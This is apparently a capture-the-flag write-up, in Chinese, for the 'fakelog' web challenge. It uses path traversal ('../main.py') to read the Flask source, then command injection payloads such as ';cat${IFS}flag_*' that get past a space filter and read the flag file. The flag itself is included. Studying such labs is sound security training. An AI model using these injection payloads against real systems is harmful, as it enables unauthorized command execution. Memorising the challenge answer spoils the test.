#Web 

## 題目

**fakelog**
給了一個網址，點開來
![[W1-18_web.png|579]]

上面有兩個按鈕 `Generate`、`Hint`
- 點 `Hint` 出現設定檔：
	```
	FROM python:3.10
	RUN curl -sSL https://install.python-poetry.org | POETRY_HOME=/etc/poetry python3 - 
	WORKDIR /app
	
	COPY pyproject.toml poetry.lock .
	RUN /etc/poetry/bin/poetry config virtualenvs.create false && \
	    /etc/poetry/bin/poetry install --no-root
	COPY . .
	ARG FLAG
	RUN echo $FLAG > /app/flag_`cat /dev/urandom | tr -dc 'a-zA-Z0-9' | fold -w 8 | head -n 1`
	USER daemon 
	ENTRYPOINT ["python", "/app/main.py"]
	```

- 點 `Generate` 出現：
  ![[W1-18_hint.png|257]]
- 點 `See Generate Algorithm`：
  ```python
  #!/usr/local/bin/python3
	import sys

	if len(sys.argv) < 2:
		print("no argument")
		sys.exit()

	magic_num = int(sys.argv[1]) if sys.argv[1].isdigit() else sys.argv[1]
	if magic_num == 0:
		print("0 is not allowed")
		sys.exit()
	while magic_num != 1:
		with open(f"fakelog/{magic_num % 6 if isinstance(magic_num, int) else magic_num}", "r", encoding="utf-8") as fd:
			print(fd.read())
		magic_num = 3 * magic_num + 1 if magic_num % 2 else magic_num // 2
	  ```


## 解題
1. 觀察設定檔：
   - `poetry install --no-root`：先裝相依套件，還沒有把程式碼複製進去
	- `COPY . .`：把整個專案原始碼複製進 image 
	- `RUN echo $FLAG > /app/flag_<隨機8碼>` -> Flag 檔案的檔名是 build 時隨機產生的，並且<mark style="background: #FFF3A3A6;"> flag 存在 /app/ 目錄下！</mark>
	- `USER daemon`：以 deamon 的身分進入
	- `ENTRYPOINT ["python", "/app/main.py"]`：進入的檔案為 `/app/main.py`
1. 觀察 `Generate Algorithm` 程式，可以發現
   - input 輸入長度 < 2 時顯示 "no argument"
	- `magic_num` 的部分
	  ```
	  magic_num = int(sys.argv[1]) if sys.argv[1].isdigit() else sys.argv[1]
	  ```
	  如果 input 是純數字，`magic_num` 就會是純數字，當 input 不是數字（ex: `../main.py`）時，就會保持路徑
	- 開啟檔案：
	  ```
	  with open(f"fakelog/{magic_num % 6 if isinstance(magic_num, int) else magic_num}"
	  ```
	  可以看到當 `magic_num` 是路徑 `../main.py` 時，打開的是 `fakelog/../main.py`
1. 輸入 `../main.py` 查看 `main.py`，簡化後：
   ```python
	@app.route('/')  
	def home():  
	return render_template('home.html')  
	  
	@app.route('/howtogen')  
	def howtogen():  
	return send_file('gen.py', mimetype='text/plain', as_attachment=False)  
	  
	@app.route('/hint')  
	def hint():  
	return send_file('Dockerfile', mimetype='text/plain', as_attachment=False)  
	  
	@app.route('/gen', methods=['GET', 'POST'])  
	def get_input():  
		message = None  
		if request.method == 'POST':  
			user_input = request.form['user_input']  
		if " " in user_input:  
			result = "evil input"  
		else:  
			result = subprocess.run(  
				f"python gen.py {user_input}", shell=True, capture_output=True, text=True).stdout.replace('\', '')  
		message = f"result: {result}"  
		return render_template('generate.html', message=message)  
	  	  
	if __name__ == "__main__":  
		app.run(host='0.0.0.0', port=5050)
   ```
	發現禁止空白輸入，並且會把輸入做為 `gen.py` 後面<mark style="background: #FFF3A3A6;">拼進 shell command！</mark>
1. 嘗試查看 id：`;id`
   ![[W1-18_id.png|300]]
2. 查看目錄 `;ls`
   ![[W1-18_ls.png|250]]
3. 查看 flag：`;cat${IFS}flag_CNX6cL5Y` or `;cat${IFS}flag_*`
   ![[W1-18_flag.png|300]]
   
4. flag = `CTF{fakelog_49d4e46d4df8dccddef3f32e}`













